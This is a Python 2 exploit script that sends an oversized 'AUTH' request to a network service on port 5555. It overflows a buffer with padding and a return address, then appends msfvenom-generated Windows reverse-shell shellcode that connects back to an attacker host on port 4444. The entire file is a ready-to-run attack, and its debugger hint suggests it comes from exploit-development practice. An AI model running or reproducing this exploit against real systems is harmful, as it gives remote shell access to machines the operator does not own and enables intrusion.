#!/usr/bin/python2
# nighter@nighter.se ( Mikael Kall )
import time, struct, sys
import socket as so

server = '192.168.1.xx'
port = 5555

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.1.xx LPORT=4444 -b '\x00\x0a\x0d' -f python -v shellcode
shellcode =  "\x90" * 10
shellcode += "\xd9\xce\xb8\x71\xc9\xc9\xf4\xd9\x74\x24\xf4"
shellcode += "\x5b\x31\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13"
shellcode += "\x03\x32\xda\x2b\x01\x48\x34\x29\xea\xb0\xc5"
shellcode += "\x4e\x62\x55\xf4\x4e\x10\x1e\xa7\x7e\x52\x72"
shellcode += "\x44\xf4\x36\x66\xdf\x78\x9f\x89\x68\x36\xf9"
shellcode += "\xa4\x69\x6b\x39\xa7\xe9\x76\x6e\x07\xd3\xb8"
shellcode += "\x63\x46\x14\xa4\x8e\x1a\xcd\xa2\x3d\x8a\x7a"
shellcode += "\xfe\xfd\x21\x30\xee\x85\xd6\x81\x11\xa7\x49"
shellcode += "\x99\x4b\x67\x68\x4e\xe0\x2e\x72\x93\xcd\xf9"
shellcode += "\x09\x67\xb9\xfb\xdb\xb9\x42\x57\x22\x76\xb1"
shellcode += "\xa9\x63\xb1\x2a\xdc\x9d\xc1\xd7\xe7\x5a\xbb"
shellcode += "\x03\x6d\x78\x1b\xc7\xd5\xa4\x9d\x04\x83\x2f"
shellcode += "\x91\xe1\xc7\x77\xb6\xf4\x04\x0c\xc2\x7d\xab"
shellcode += "\xc2\x42\xc5\x88\xc6\x0f\x9d\xb1\x5f\xea\x70"
shellcode += "\xcd\xbf\x55\x2c\x6b\xb4\x78\x39\x06\x97\x14"
shellcode += "\x8e\x2b\x27\xe5\x98\x3c\x54\xd7\x07\x97\xf2"
shellcode += "\x5b\xcf\x31\x05\x9b\xfa\x86\x99\x62\x05\xf7"
shellcode += "\xb0\xa0\x51\xa7\xaa\x01\xda\x2c\x2a\xad\x0f"
shellcode += "\xe2\x7a\x01\xe0\x43\x2a\xe1\x50\x2c\x20\xee"
shellcode += "\x8f\x4c\x4b\x24\xb8\xe7\xb6\xaf\x07\x5f\xb9"
shellcode += "\x39\xe0\xa2\xb9\x54\xac\x2b\x5f\x3c\x5c\x7a"
shellcode += "\xc8\xa9\xc5\x27\x82\x48\x09\xf2\xef\x4b\x81"
shellcode += "\xf1\x10\x05\x62\x7f\x02\xf2\x82\xca\x78\x55"
shellcode += "\x9c\xe0\x14\x39\x0f\x6f\xe4\x34\x2c\x38\xb3"
shellcode += "\x11\x82\x31\x51\x8c\xbd\xeb\x47\x4d\x5b\xd3"
shellcode += "\xc3\x8a\x98\xda\xca\x5f\xa4\xf8\xdc\x99\x25"
shellcode += "\x45\x88\x75\x70\x13\x66\x30\x2a\xd5\xd0\xea"
shellcode += "\x81\xbf\xb4\x6b\xea\x7f\xc2\x73\x27\xf6\x2a"
shellcode += "\xc5\x9e\x4f\x55\xea\x76\x58\x2e\x16\xe7\xa7"
shellcode += "\xe5\x92\x07\x4a\x2f\xef\xaf\xd3\xba\x52\xb2"
shellcode += "\xe3\x11\x90\xcb\x67\x93\x69\x28\x77\xd6\x6c"
shellcode += "\x74\x3f\x0b\x1d\xe5\xaa\x2b\xb2\x06\xff"


buffer = 'A' * 1040 + '\x71\x1D\xD1\x65' + shellcode
req1 = "AUTH " + buffer

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"

s.close()
